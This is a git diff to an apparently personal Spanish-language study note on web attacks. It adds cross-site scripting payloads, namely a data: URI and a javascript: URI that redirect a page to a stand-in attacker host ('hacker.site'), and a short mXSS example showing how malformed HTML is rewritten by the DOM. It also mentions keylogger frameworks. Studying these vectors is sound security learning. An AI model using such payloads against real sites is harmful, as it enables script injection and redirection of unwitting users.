@@ -134,5 +134,29 @@ Algunos frameworks:
 - *http_javascript_keylogger (Metasploit)*
 - *Event logger:* Es mas sofisticado
 
+****
 
-Pq se termina el curro de los microfonos ensobrados hijos de la pauta
+data:text/html,<script>document.location="http://hacker.site"</script>
+
+javascript:{this.window='<script>document.location="https://google.com"</script>'}
+
+
+### mXSS
+
+Es un vector que ocurre en el innerHTML y esta relacionado con las propiedades del DOM
+
+```html
+<!-- input -->
+<p>Hi
+<p/id=pID>Hi
+<?Hi
+<DiV/><doce///>Hi</plaintext><h1>high
+
+<!-- Output -->
+<p>Hi</p>
+<p/id=pID>Hi</p>
+<!-- Hi -->
+<div><code>Hi<h1>high</h1></code></div>
+```
+
+
